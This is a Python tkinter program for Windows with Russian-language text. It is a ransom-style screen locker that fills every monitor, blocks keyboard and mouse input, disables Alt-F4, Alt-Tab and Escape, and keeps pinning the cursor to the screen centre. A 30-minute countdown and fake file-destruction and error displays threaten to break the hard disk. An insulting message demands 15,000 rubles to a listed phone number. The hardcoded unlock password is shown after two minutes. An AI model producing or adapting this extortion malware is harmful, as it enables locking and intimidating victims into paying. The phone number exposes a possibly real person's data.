import tkinter as tk
from tkinter import messagebox
import time
import random
import sys
import winsound
import ctypes
import pyautogui

class FileAnimation:
    def __init__(self, parent):
        self.parent = parent
        self.frame = tk.Frame(parent, bg='gray', bd=2, relief='groove')
        self.frame.place(relx=0.98, rely=0.98, anchor='se', width=350, height=400)
        
        self.canvas = tk.Canvas(self.frame, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        self.all_files = self.generate_file_list(150)  # 150 файлов
        self.active_files = []
        self.last_beep = 0
        self.start_time = time.time()
        
    def generate_file_list(self, count):
        base_files = [
            "kernel32.dll", "ntoskrnl.exe", "hal.dll", "win32k.sys",
            "explorer.exe", "svchost.exe", "csrss.exe", "smss.exe",
            "system32.dll", "user32.dll", "gdi32.dll", "advapi32.dll",
            "ntdll.dll", "shell32.dll", "msvcrt.dll", "comctl32.dll",
            "atapi.sys", "tcpip.sys", "disk.sys", "SYSTEM", "SOFTWARE",
            "SECURITY", "bootmgr", "winload.exe", "winresume.exe", 
            "pagefile.sys", "registry", "SAM", "DEFAULT", "DRIVERS"
        ]
        
        # Генерируем больше файлов на основе базовых
        file_list = []
        for i in range(count):
            base = random.choice(base_files)
            if random.random() > 0.7:  # 30% chance to modify filename
                base = f"{base.split('.')[0]}_{random.randint(1,9)}.{base.split('.')[1] if '.' in base else 'sys'}"
            file_list.append(f"[{i+1:03d}] {base}")
        return file_list
    
    def update_animation(self):
        self.canvas.delete('all')
        
        # Добавляем 1-3 новых файла каждые 0.3 секунды
        current_time = time.time()
        if current_time - self.start_time >= 0.3:
            for _ in range(random.randint(1, 3)):
                self.active_files.append({
                    'text': random.choice(self.all_files),
                    'y': random.randint(-50, 0),
                    'speed': random.uniform(1.5, 3.0),
                    'color': f'#00{random.randint(150, 255):02X}00'
                })
            self.start_time = current_time
        
        # Обновляем позиции файлов
        for file in self.active_files[:]:
            file['y'] += file['speed']
            if file['y'] > 400:
                # Перемещаем файл вверх для бесконечного цикла
                file['y'] = random.randint(-100, -20)
                file['text'] = random.choice(self.all_files)
            else:
                self.canvas.create_text(
                    15, file['y'],
                    text=file['text'],
                    fill=file['color'],
                    font=('Courier New', 11, 'bold'),
                    anchor='w'
                )
        
        # Звуковой сигнал каждую секунду
        if current_time - self.last_beep >= 1.0:
            winsound.Beep(random.randint(800, 1200), 100)
            self.last_beep = current_time
        
        self.parent.after(30, self.update_animation)

def block_input():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

def disable_event():
    return "break"

def check_password():
    entered_password = password_entry.get()
    if entered_password == "123456789":
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        root.destroy()
        sys.exit()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль! Попробуйте снова.")
        password_entry.delete(0, tk.END)
        password_entry.focus_set()

def update_timer():
    global remaining_time
    if remaining_time > 0:
        mins, secs = divmod(remaining_time, 60)
        timer_label.config(text=f"{mins:02d}:{secs:02d}")
        remaining_time -= 1
        root.after(1000, update_timer)
        
        if remaining_time % 2 == 0:
            warning_label.config(fg='red')
        else:
            warning_label.config(fg='black')
        
        if remaining_time < 60:
            timer_label.config(fg=random.choice(['red', 'white', 'yellow']))
    else:
        timer_label.config(text="00:00", fg='red')
        warning_label.config(text="Ваш жесткий диск сломан!", fg='red')
        simulate_crash()

def simulate_crash():
    for _ in range(30):
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        error = tk.Label(root, 
                       text=f"ERROR 0x{random.randint(0, 0xFFFF):04X}", 
                       fg='white', 
                       bg='red', 
                       font=('Arial', random.randint(8, 24)))
        error.place(x=x, y=y)
        root.update_idletasks()

def create_number_pad():
    number_frame = tk.Frame(root, bg='black')
    number_frame.pack(pady=(10, 0))
    
    buttons = []
    for i in range(1, 10):
        btn = tk.Button(
            number_frame,
            text=str(i),
            command=lambda num=i: password_entry.insert(tk.END, str(num)),
            bg='black',
            fg='white',
            font=('Arial', 16),
            relief='flat',
            activebackground='red',
            activeforeground='white',
            bd=2,
            width=3,
            height=1
        )
        btn.grid(row=(i-1)//3, column=(i-1)%3, padx=5, pady=5)
        buttons.append(btn)
    
    # Добавляем кнопку 0
    btn0 = tk.Button(
        number_frame,
        text="0",
        command=lambda: password_entry.insert(tk.END, "0"),
        bg='black',
        fg='white',
        font=('Arial', 16),
        relief='flat',
        activebackground='red',
        activeforeground='white',
        bd=2,
        width=3,
        height=1
    )
    btn0.grid(row=3, column=1, padx=5, pady=5)
    buttons.append(btn0)
    
    # Кнопка очистки
    clear_btn = tk.Button(
        number_frame,
        text="C",
        command=lambda: password_entry.delete(0, tk.END),
        bg='black',
        fg='white',
        font=('Arial', 16),
        relief='flat',
        activebackground='red',
        activeforeground='white',
        bd=2,
        width=3,
        height=1
    )
    clear_btn.grid(row=3, column=2, padx=5, pady=5)
    buttons.append(clear_btn)

def show_password_window():
    # Создаем новое окно с паролем
    pw_window = tk.Toplevel(root)
    pw_window.attributes('-topmost', True)
    pw_window.geometry("300x100+50+{}".format(root.winfo_screenheight()-150))
    pw_window.configure(bg='white')
    pw_window.overrideredirect(True)  # Убираем рамку окна
    
    label = tk.Label(
        pw_window,
        text=f"Пароль: 123456789",
        fg='black',
        bg='white',
        font=('Arial', 16, 'bold')
    )
    label.pack(expand=True, fill='both', padx=20, pady=20)

def create_windows_on_all_monitors():
    try:
        import screeninfo
        monitors = screeninfo.get_monitors()
        if len(monitors) > 1:
            for i, monitor in enumerate(monitors[1:], 1):  # Пропускаем первый монитор (основное окно)
                new_root = tk.Toplevel(root)
                new_root.attributes('-fullscreen', True)
                new_root.attributes('-topmost', True)
                new_root.configure(bg='black')
                new_root.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")
                
                # Добавляем такой же контент на дополнительные мониторы
                label = tk.Label(
                    new_root,
                    text="Ваша система заблокирована!",
                    fg='red',
                    bg='black',
                    font=('Arial', 36, 'bold'),
                    justify='center'
                )
                label.pack(expand=True)
                
                # Блокировка закрытия
                new_root.protocol("WM_DELETE_WINDOW", disable_event)
                for key in ['<Alt-F4>', '<Control-w>', '<Escape>', '<Alt-Tab>', '<Super>']:
                    new_root.bind(key, disable_event)
    except:
        pass  # Если не удалось получить информацию о мониторах

# Основное окно
root = tk.Tk()
root.title(" ")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')

# Создаем окна на всех мониторах
create_windows_on_all_monitors()

# Блокировка мыши и клавиатуры при запуске
block_input()

# Блокировка закрытия
root.protocol("WM_DELETE_WINDOW", disable_event)
for key in ['<Alt-F4>', '<Control-w>', '<Escape>', '<Alt-Tab>', '<Super>']:
    root.bind(key, disable_event)

# Таймер (30 минут)
remaining_time = 30 * 60

# Интерфейс
timer_label = tk.Label(
    root,
    text="30:00",
    fg='red',
    bg='black',
    font=('Arial', 42, 'bold'),
    justify='center'
)
timer_label.pack(pady=(40, 0))

warning_label = tk.Label(
    root,
    text="По окончанию таймера ваш жесткий диск будет сломан",
    fg='red',
    bg='black',
    font=('Arial', 18, 'bold'),
    justify='center'
)
warning_label.pack(pady=(10, 25))

label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте мне 15 000р на этот номер: +7 914 267 24 91 сбер",
    fg='red',
    bg='black',
    font=('Arial', 26, 'bold'),
    justify='center'
)
label.pack(pady=(0, 30))

# Поле ввода пароля
password_frame = tk.Frame(root, bg='black')
password_frame.pack()

password_entry = tk.Entry(
    password_frame,
    show="*",
    font=('Arial', 20),
    width=18,
    bg='black',
    fg='white',
    insertbackground='white',
    relief='flat',
    bd=4
)
password_entry.pack(pady=(0, 10), padx=5, pady=5)
password_entry.focus_set()

# Создаем цифровую клавиатуру
create_number_pad()

button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 18),
    relief='flat',
    activebackground='red',
    activeforeground='white',
    bd=0
)
button.pack(pady=(10, 0))

# Анимация файлов
file_animation = FileAnimation(root)
file_animation.update_animation()

# Таймер
update_timer()

# Блокировка курсора
def block_cursor():
    try:
        pyautogui.FAILSAFE = False
        screen_width, screen_height = pyautogui.size()
        pyautogui.moveTo(screen_width//2, screen_height//2)
    except:
        pass
    root.after(100, block_cursor)

block_cursor()

# Запускаем таймер для показа окна с паролем через 2 минуты
root.after(120000, show_password_window)

root.mainloop()